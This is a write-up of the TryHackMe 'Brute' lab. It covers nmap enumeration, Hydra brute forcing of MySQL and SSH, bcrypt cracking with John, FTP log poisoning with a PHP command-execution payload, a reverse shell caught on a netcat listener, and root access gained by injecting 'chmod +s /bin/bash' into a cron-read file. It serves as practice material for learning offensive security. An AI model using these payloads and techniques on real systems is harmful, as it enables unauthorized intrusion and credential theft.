# **Brute - TryHackMe**

*Target Ip. Address: 10.48.141.232*

Let's start with the nmap scan.

```bash
kali@kali:nmap -sV -sC 10.48.141.232
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-20 12:36 +0545
Nmap scan report for 10.48.141.232 (10.48.141.232)
Host is up (0.039s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.5
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 43:07:a9:0d:93:32:83:5e:c9:f0:1f:f4:25:79:3e:3d (RSA)
|   256 f4:09:4a:f6:1b:60:03:cf:24:64:f1:fc:4e:d4:a5:e7 (ECDSA)
|_  256 bc:a3:ad:8f:b1:bc:d1:bd:a4:f4:7d:f8:7f:4a:2a:26 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Login
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
3306/tcp open  mysql   MySQL 8.0.41-0ubuntu0.20.04.1
|_ssl-date: TLS randomness does not represent time
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.41-0ubuntu0.20.04.1
|   Thread ID: 10583
|   Capabilities flags: 65535
|   Some Capabilities: ODBCClient, FoundRows, SupportsTransactions, ConnectWithDatabase, SupportsLoadDataLocal, Speaks41ProtocolOld, Speaks41ProtocolNew, SwitchToSSLAfterHandshake, Support41Auth, SupportsCompression, IgnoreSigpipes, DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, LongColumnFlag, LongPassword, InteractiveClient, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: Q o\x1B
| \x196bCt\x1D%GAuH'GA\x0D
|_  Auth Plugin Name: caching_sha2_password
| ssl-cert: Subject: commonName=MySQL_Server_8.0.26_Auto_Generated_Server_Certificate
| Not valid before: 2021-10-19T04:00:09
|_Not valid after:  2031-10-17T04:00:09
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.98 second
```

We have 4 ports open.

```info
Port 21: ftp --> no anonymous login allowed.
Port 22: ssh
Port 80: http --> starts with a login page
Port 3306: mysql --> It is leaking too much information from nmap scan, let's enum it if we can get more info.
```

Let's use nmap's script: mysql-enum to get information from mysql.

```bash
kali@kali:nmap -p 3306 --script=mysql-enum 10.48.141.232
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-20 12:41 +0545
Nmap scan report for 10.48.141.232 (10.48.141.232)
Host is up (0.037s latency).

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-enum:
|   Valid usernames:
|     admin:<empty> - Valid credentials
|     test:<empty> - Valid credentials
|     user:<empty> - Valid credentials
|     web:<empty> - Valid credentials
|     netadmin:<empty> - Valid credentials
|     root:<empty> - Valid credentials
|     webadmin:<empty> - Valid credentials
|     sysadmin:<empty> - Valid credentials
|     administrator:<empty> - Valid credentials
|     guest:<empty> - Valid credentials
|_  Statistics: Performed 10 guesses in 1 seconds, average tps: 10.0
Nmap done: 1 IP address (1 host up) scanned in 0.52 seconds
```

We have some usernames. Among them root is available, let's try to brute force root's password.

```bash
kali@kali:hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://10.48.141.232
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-20 12:56:40
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking mysql://10.48.141.232:3306/
[3306][mysql] host: 10.48.141.232   login: root   password: r...u
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-20 12:56:52
```

We have ourselves a valid credentials for mysql. Let's login.

```bash
kali@kali:mysql -u root -h 10.48.141.232 --ssl=0 -p
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 10680
Server version: 8.0.41-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```

We are inside the database. Let's find some user credentials.

```bash
MySQL [website]> select * from users;
+----+----------+--------------------------------------------------------------+---------------------+
| id | username | password                                                     | created_at          |
+----+----------+--------------------------------------------------------------+---------------------+
|  1 | Adrian   | $2y$10$tL...we                                               | 2021-10-20 02:43:42 |
+----+----------+--------------------------------------------------------------+---------------------+
1 row in set (0.039 sec)

MySQL [website]> 
```

We find a password hash for user Adrian under website database. Let's crack this bcrypt password.

```bash
kali@kali:john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
t...r           (?)     
1g 0:00:00:00 DONE (2026-02-20 13:00) 3.448g/s 124.1p/s 124.1c/s 124.1C/s 123456..liverpool
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Now, we can login to the website at port 80 as user Adrian.

<img width="1239" height="949" alt="image" src="https://github.com/user-attachments/assets/c58111f4-7ad4-48ea-8aa6-729f33ad9f48" />

There we see the logs of ftp. Please don't mind the long logs, I was bruteforcing the ftp login in the background.

Seeing this long list of logs. We can try log poisioning during ftp login.

```bash
kali@kali:ftp 10.48.141.232
Connected to 10.48.141.232.
220 (vsFTPd 3.0.5)
Name (10.48.141.232:kali): <?php system($_GET['cmd']); ?>
331 Please specify the password.
Password:
530 Login incorrect.
ftp: Login failed
ftp>
```

Let's check if this was successful.

<img width="1243" height="908" alt="image" src="https://github.com/user-attachments/assets/a5f35df3-d0b6-44c4-afcd-c126554cdc91" />

It was successful. Now, we can use any reverse shell techniques to get a reverse shell.

I recommend a python reverse shell and don't forget to URL encode.

```bash
kali@kali:nc -nlvp 4445
listening on [any] 4445 ...
connect to [192.168.130.26] from (UNKNOWN) [10.48.141.232] 34160
www-data@ip-10.48.141.232:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We find a .remainder in adrian home directory.

```bash
www-data@ip-10.48.141.232:/home/adrian$ cat .reminder
cat .reminder
Rules:
best of 64
+ exclamation

et...te
```

So, we put 'et...te!' in pass (note: don't forget that exclamation), and generate wordlist with rule: best64.

```bash
kali@kali:john -wordlist:pass -rules:best64 -stdout > password
Using default input encoding: UTF-8
Press 'q' or Ctrl-C to abort, almost any other key for status
75p 0:00:00:00 100.00% (2026-02-20 13:42) 1875p/s erute!
```

Let's use hydra to brute force the password for user adrian.

```bash
kali@kali:hydra -l adrian -P password ssh://10.48.141.232                                                                                                
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-20 13:42:35
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 75 login tries (l:1/p:75), ~5 tries per task
[DATA] attacking ssh://10.48.141.232:22/
[22][ssh] host: 10.48.141.232   login: adrian   password: th...te!
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-20 13:42:44
```

We have a password for adrian. Let's login via ssh for proper tty.

```bash
kali@kali:ssh adrian@10.48.141.232
The authenticity of host '10.48.141.232 (10.48.141.232)' can't be established.
ED25519 key fingerprint is: SHA256:joDMypjnP21x5gvf2nEJdVAMWUMgKedPdS2NoQ8wdMU
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.48.141.232' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
adrian@10.48.141.232's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-138-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri 20 Feb 2026 07:57:42 AM UTC

  System load:  0.0                Processes:             144
  Usage of /:   42.6% of 18.53GB   Users logged in:       0
  Memory usage: 18%                IPv4 address for ens5: 10.48.141.232
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Your Hardware Enablement Stack (HWE) is supported until April 2025.

Last login: Tue Apr  5 23:46:50 2022 from 10.0.2.26
adrian@ip-10.48.141.232:~$
```

We get our first flag at home directory.

```bash
adrian@ip-10.48.141.232:~$ cat user.txt 
THM{Po.....0g}
```

We have no SUID no sudo permissions, but we have something interesting.

```bash
adrian@ip-10.48.141.232:~$ cat punch_in
Punched in at 07:29
Punched in at 07:30
.
.
.
Punched in at 07:59
Punched in at 08:00
```

And the script to run this is in our home directory as well.

```bash
adrian@ip-10.48.141.232:~$ cat punch_in.sh
#!/bin/bash

/usr/bin/echo 'Punched in at '$(/usr/bin/date +"%H:%M") >> /home/adrian/punch_in
```

We find some more info inside ftp directory.

```bash
adrian@ip-10.48.141.232:~/ftp/files$ cat .notes
That silly admin
He is such a micro manager, wants me to check in every minute by writing
on my punch card.

He even asked me to write the script for him.

Little does he know, I am planning my revenge.
adrian@ip-10.48.141.232:~/ftp/files$ cat script
#!/bin/sh
while read line;
do
  /usr/bin/sh -c "echo $line";
done < /home/adrian/punch_in
```

So, we have a frustated employee here. The script was executing whatever was on each line of the /home/adrian/punch_in file. 

Let's abuse this as we have write access on punch_in.

```bash
adrian@ip-10.48.141.232:~$ cat punch_in
;chmod +s /bin/bash
```

Wait for the cron job to run and execute our command.

```bash
adrian@ip-10.48.141.232:~$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

So, we have a SUID /bin/bash, let's be root.

```bash
adrian@ip-10.48.141.232:~$ /bin/bash -p
bash-5.0# id
uid=1000(adrian) gid=1000(adrian) euid=0(root) egid=0(root) groups=0(root),1000(adrian)
```

We are root. Let's end the challenge by reading final flag at root directory.

```bash
bash-5.0# cat root.txt 
THM{C0.....T3}
```
